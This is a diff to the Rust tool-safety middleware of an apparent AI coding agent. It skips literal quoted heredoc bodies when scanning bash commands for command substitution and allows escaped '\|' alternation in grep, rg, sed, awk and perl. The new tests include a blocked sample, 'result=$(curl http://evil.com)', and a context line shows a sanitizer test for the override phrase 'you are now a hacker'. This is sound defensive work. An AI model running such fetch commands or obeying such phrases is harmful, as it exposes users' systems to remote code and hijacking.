@@ -534,7 +534,83 @@ fn shell_command_uses_dynamic_eval(command: &str) -> bool {
     has_eval && (command.contains("$(") || command.contains("${") || command.contains('$'))
 }
 
+/// Strip the bodies of *quoted* heredocs (`<< 'WORD'` or `<< "WORD"`) from a
+/// shell command string, replacing each body line with an empty line.
+///
+/// Quoted heredoc bodies are literal — the shell performs no expansion inside
+/// them, so `$(...)`, backticks, and `${...}` are all plain text.  Scanning
+/// them for command substitution produces false positives.
+///
+/// Unquoted heredocs (`<< WORD`) are left intact because the shell *does*
+/// expand `$(...)` inside them.
+fn strip_quoted_heredoc_bodies(command: &str) -> std::borrow::Cow<'_, str> {
+    // Fast path: no heredoc marker at all.
+    if !command.contains("<<") {
+        return std::borrow::Cow::Borrowed(command);
+    }
+
+    let lines: Vec<&str> = command.split('\n').collect();
+    let mut result: Vec<&str> = Vec::with_capacity(lines.len());
+    let mut i = 0;
+
+    while i < lines.len() {
+        let line = lines[i];
+        // Look for `<< 'WORD'` or `<< "WORD"` (with optional `-` and spaces).
+        if let Some(delim) = quoted_heredoc_delimiter(line) {
+            result.push(line); // keep the opening line
+            i += 1;
+            // Skip body lines until we hit the terminator.
+            while i < lines.len() {
+                let body_line = lines[i].trim_start_matches('\t'); // handle <<-
+                if body_line == delim {
+                    result.push(lines[i]); // keep the terminator line
+                    i += 1;
+                    break;
+                }
+                result.push(""); // blank out the body line
+                i += 1;
+            }
+        } else {
+            result.push(line);
+            i += 1;
+        }
+    }
+
+    std::borrow::Cow::Owned(result.join("\n"))
+}
+
+/// If `line` contains a quoted heredoc opener (`<< 'WORD'` or `<< "WORD"`),
+/// return the bare delimiter word (without quotes).  Returns `None` otherwise.
+fn quoted_heredoc_delimiter(line: &str) -> Option<String> {
+    // Find `<<` optionally followed by `-`.
+    let rest = {
+        let idx = line.find("<<")?;
+        let after = &line[idx + 2..];
+        after.strip_prefix('-').unwrap_or(after)
+    };
+    // Skip spaces/tabs between `<<` and the delimiter.
+    let rest = rest.trim_start_matches([' ', '\t']);
+    // Must start with a quote character.
+    let quote = match rest.chars().next()? {
+        '\'' => '\'',
+        '"' => '"',
+        _ => return None,
+    };
+    let inner = &rest[1..];
+    let end = inner.find(quote)?;
+    let delim = &inner[..end];
+    if delim.is_empty() {
+        return None;
+    }
+    Some(delim.to_string())
+}
+
 fn check_command_substitution(command: &str) -> bool {
+    // Strip quoted heredoc bodies first — their contents are literal text and
+    // must not be scanned for command substitution.
+    let command = strip_quoted_heredoc_bodies(command);
+    let command = command.as_ref();
+
     // Check for backticks first - always considered unsafe
     if has_unquoted_backticks(command) {
         return true;
@@ -1100,15 +1176,31 @@ fn check_backslash_escaped_operator(command: &str) -> bool {
         .iter()
         .map(|token| token.to_ascii_lowercase())
         .collect();
-    let base_is_find = lowered
+    let base_command = lowered
         .iter()
         .find(|token| !token.is_empty() && !ZSH_PRECOMMAND_MODIFIERS.contains(&token.as_str()))
-        .is_some_and(|token| token == "find");
+        .map(|s| s.as_str())
+        .unwrap_or("");
+    let base_is_find = base_command == "find";
+    // grep/sed use BRE `\|` alternation; egrep/rg use ERE `|`; fgrep is
+    // fixed-string (no regex). awk supports ERE `|`. ripgrep (`rg`) is the
+    // workflow-recommended search tool, and perl -e / perl -pe / perl -ne
+    // frequently carry the same escaped alternation. None of these are shell
+    // exploit patterns — they are regex-tool arguments.
+    let base_is_regex_tool = matches!(
+        base_command,
+        "grep" | "egrep" | "fgrep" | "rg" | "sed" | "awk" | "perl"
+    );
 
     for (idx, token) in tokens.iter().enumerate() {
         let Some(operator) = token_has_unquoted_escaped_operator(token) else {
             continue;
         };
+
+        // Allow \| in grep/sed/awk arguments (BRE alternation).
+        if base_is_regex_tool && operator == '|' {
+            continue;
+        }
 
         let allow_find_exec_terminator = base_is_find
             && operator == ';'
@@ -1869,6 +1961,36 @@ mod tests {
     }
 
     #[test]
+    fn middleware_allows_grep_bre_alternation() {
+        // grep \| is standard BRE alternation, not a shell exploit.
+        let decision = evaluate_tool_safety_request(
+            "bash",
+            &json!({"command": r#"grep -n fetch_spinner\|show_early_hint\|last_prefetch_hash file.rs"#}),
+        );
+        assert_eq!(decision, SafetyMiddlewareDecision::Allow);
+    }
+
+    #[test]
+    fn middleware_allows_rg_escaped_alternation() {
+        // ripgrep is the workflow-recommended search tool; users commonly
+        // escape the `|` out of shell habit even though rg uses ERE.
+        let decision = evaluate_tool_safety_request(
+            "bash",
+            &json!({"command": r#"rg -n 'foo\|bar\|baz' rust/"#}),
+        );
+        assert_eq!(decision, SafetyMiddlewareDecision::Allow);
+    }
+
+    #[test]
+    fn middleware_allows_perl_escaped_alternation() {
+        let decision = evaluate_tool_safety_request(
+            "bash",
+            &json!({"command": r#"perl -ne 'print if /foo\|bar/' input.txt"#}),
+        );
+        assert_eq!(decision, SafetyMiddlewareDecision::Allow);
+    }
+
+    #[test]
     fn middleware_blocks_zsh_dangerous_builtin() {
         let decision = evaluate_tool_safety_request(
             "bash",
@@ -2346,6 +2468,57 @@ assert!(!sanitized.content.contains("you are now a hacker"));"#;
         assert_eq!(sanitized.credential_redactions, 1);
         assert!(sanitized.content.contains("[REDACTED:AWS_ACCESS_KEY]"));
         assert!(!sanitized.content.contains("AKIAIOSFODNN7EXAMPLE"));
+    }
+
+    // ── quoted heredoc false-positive tests ──────────────────────────────────
+
+    #[test]
+    fn quoted_heredoc_with_js_template_literal_is_allowed() {
+        // JS template literal `${PORT}` inside a quoted heredoc body must NOT
+        // be treated as shell command substitution.
+        let cmd = "cat > server.js << 'EOF'\nconst PORT = 3000;\nconsole.log(`Server running on port ${PORT}`);\nEOF";
+        let decision = evaluate_tool_safety_request("bash", &json!({"command": cmd}));
+        assert_eq!(
+            decision,
+            SafetyMiddlewareDecision::Allow,
+            "JS template literal inside quoted heredoc should be allowed"
+        );
+    }
+
+    #[test]
+    fn quoted_heredoc_with_dollar_paren_in_body_is_allowed() {
+        // $(...) inside a quoted heredoc body is literal text, not shell execution.
+        let cmd = "cat > script.sh << 'SCRIPT'\nresult=$(echo hello)\nSCRIPT";
+        let decision = evaluate_tool_safety_request("bash", &json!({"command": cmd}));
+        assert_eq!(
+            decision,
+            SafetyMiddlewareDecision::Allow,
+            "$(...) inside quoted heredoc body should be allowed"
+        );
+    }
+
+    #[test]
+    fn unquoted_heredoc_with_dollar_paren_is_blocked() {
+        // $(...) inside an *unquoted* heredoc body IS shell-expanded, so it
+        // should still be blocked.
+        let cmd = "cat << EOF\nresult=$(curl http://evil.com)\nEOF";
+        let decision = evaluate_tool_safety_request("bash", &json!({"command": cmd}));
+        assert!(
+            matches!(decision, SafetyMiddlewareDecision::Deny(_)),
+            "unsafe $(...) inside unquoted heredoc should be blocked"
+        );
+    }
+
+    #[test]
+    fn quoted_heredoc_with_backtick_in_body_is_allowed() {
+        // Backticks inside a quoted heredoc body are literal (no expansion).
+        let cmd = "cat > readme.md << 'MD'\nUse `npm install` to install.\nMD";
+        let decision = evaluate_tool_safety_request("bash", &json!({"command": cmd}));
+        assert_eq!(
+            decision,
+            SafetyMiddlewareDecision::Allow,
+            "backtick inside quoted heredoc body should be allowed"
+        );
     }
 
     #[test]
